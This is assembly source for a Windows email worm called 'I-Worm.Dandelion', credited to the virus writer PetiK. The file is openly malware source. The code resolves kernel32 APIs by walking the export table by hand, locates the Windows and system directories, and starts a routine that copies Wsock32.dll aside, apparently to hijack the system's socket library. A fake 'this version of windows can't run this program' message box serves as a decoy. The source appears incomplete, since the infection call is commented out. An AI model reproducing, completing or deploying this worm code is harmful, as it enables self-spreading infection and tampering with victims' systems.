comment #
Name : I-Worm.Dandelion
Author : PetiK
Date : November 6th
Size : 

Action: 

To delete the worm :
Look at the file Delete_Dandelion.vbs


To built the worm :

Notes of the authors:

#

.586p
.model flat, stdcall

locals
JUMPS

    extrn ExitProcess:PROC
    extrn GetVersion:PROC
    extrn MessageBoxA:PROC

include useful.inc

.data

start:
    xor ebp,ebp
    call    GetVersion
    or  eax,eax
    jz  ret_host_worm

    pushad
    call    get_api_address
    call    get_win
    call    get_sys
;   call    infect_wsock
    popad


ret_host_worm:
    jmp host_worm

; get_api_address
kern32addr      dd 0BFF70000h
numbernames     dd ?
addressfunctions    dd ?
addressnames        dd ?
addressordinals     dd ?
index           dd ?
ptkGetProcAddress   db 'GetProcAddress',0
ptkGetProcAddressA  dd 0

; get_base
wsock32         db 'WSOCK32.dll',0
wsock32addr     dd 0
user32          db 'USER32.dll',0
user32addr      dd 0
ptkLoadLibrary      db 'LoadLibrary',0

; directory
windir          db 100h dup (0)
sysdir          db 100h dup (0)
curdir          db 100h dup (0)
ptkGetWindowsDirectoryA db 'GetWindowsDirectoryA',0
ptkGetSystemDirectoryA  db 'GetSystemDirectoryA',0
ptkSetCurrentDirectoryA db 'SetCurrentDirectoryA',0

; infect_wsock
wsock32ptk      db 'Wsock32.ptk',0
wsock32dll      db 'Wsock32.dll',0
ptkCopyFileA        db 'CopyFileA',0

get_api_address proc

    mov edi,[ebp + kern32addr]
    add edi,[edi + 3Ch]
    mov esi,[edi + 78h]
    add esi,[ebp + kern32addr]

    mov eax,dword ptr [esi + 18h]
    mov [ebp + numbernames],eax

    mov eax,dword ptr [esi + 1Ch]
    add eax,[ebp + kern32addr]
    mov [ebp + addressfunctions],eax

    mov eax,dword ptr [esi + 20h]
    add eax,[ebp + kern32addr]
    mov [ebp + addressnames],eax

    mov eax,dword ptr [esi + 24h]
    add eax,[ebp + kern32addr]
    mov [ebp + addressordinals],eax

    mov esi,[ebp + addressnames]
    mov [ebp + index],esi
    mov edi,[esi]
    add edi,[ebp + kern32addr]
    xor ecx,ecx
    lea ebx,[ebp + ptkGetProcAddress]

    encore:
    mov esi,ebp

    mb:
    cmpsb
    jne prochain
    cmp byte ptr [esi],0
    je  on_y_va
    jmp mb

    prochain:
    inc cx
    add dword ptr [ebp + index],4
    mov esi,[ebp + index]
    mov edi,[esi]
    add edi,[ebp + kern32addr]
    jmp encore

    on_y_va:
    shl ecx,1
    mov esi,[ebp + addressordinals]
    add esi,ecx
    xor eax,eax
    mov ax,word ptr [esi]
    shl eax,2
    mov esi,[ebp + addressfunctions]
    add esi,eax
    mov edi,dword ptr [esi]
    add edi,[ebp + kern32addr]
    mov [ebp + ptkGetProcAddressA],edi
    ret

get_api_address endp

; =================================================

get_wsock32_base    proc
    loadwsock32:
    lea eax,[ebp + wsock32]
    push    eax
    lea eax,[ebp + ptkLoadLibrary]
    call    get_api
    mov [ebp + wsock32addr],eax
    ret
get_wsock32_base    endp

get_user32_base proc
    loaduser32:
    lea eax,[ebp + user32]
    push    eax
    lea eax,[ebp + ptkLoadLibrary]
    call    get_api
    mov [ebp + user32addr],eax
    ret
get_user32_base endp

; =================================================

get_api proc
    push    eax
    push    dword ptr [ebp + kern32addr]
    call    [ebp + ptkGetProcAddressA]
    jmp eax
    ret
get_api endp

get_u_api   proc
    push    eax
    push    dword ptr [ebp + user32addr]
    call    [ebp + ptkGetProcAddressA]
    jmp eax
    ret
get_u_api   endp

get_w_api   proc
    push    eax
    push    dword ptr [ebp + wsock32addr]
    call    [ebp + ptkGetProcAddressA]
    jmp eax
    ret
get_w_api endp

; =================================================

get_win proc
    get_windir:
    push    100h
    lea eax,[ebp + windir]
    push    eax
    lea     eax,[ebp + ptkGetWindowsDirectoryA]
    call    get_api
    ret
get_win endp

get_sys proc
    get_sysdir:
    push    100h
    lea eax,[ebp + sysdir]
    push    eax
    lea     eax,[ebp + ptkGetSystemDirectoryA]
    call    get_api
    ret
get_sys endp

set_win proc
    set_windir:
    lea eax,[ebp + windir]
    push    eax
    lea     eax,[ebp + ptkSetCurrentDirectoryA]
    call    get_api
    ret
set_win endp

set_sys proc
    set_sysdir:
    lea eax,[ebp + sysdir]
    push    eax
    lea     eax,[ebp + ptkSetCurrentDirectoryA]
    call    get_api
    ret
set_sys endp

; =================================================
infect_wsock    proc
    call    set_sys

    copy_wsock:
    push    0
    lea eax,[ebp + wsock32ptk]
    push    eax
    lea eax,[ebp + wsock32dll]
    push    eax
    lea eax,[ebp + ptkCopyFileA]
    call    get_api


infect_wsock    endp


.code
host_worm:
    push    40h
    call    @title
    db  'Micro$oft Windows',0
    @title:
    call    @txt
    db  'This version of windows can''t run this program',CRLF,CRLF
    db  9,'BYE BYE',0
    @txt:
    push    0
    call    MessageBoxA


exit_worm:
    push    0
    call    ExitProcess

end start
end
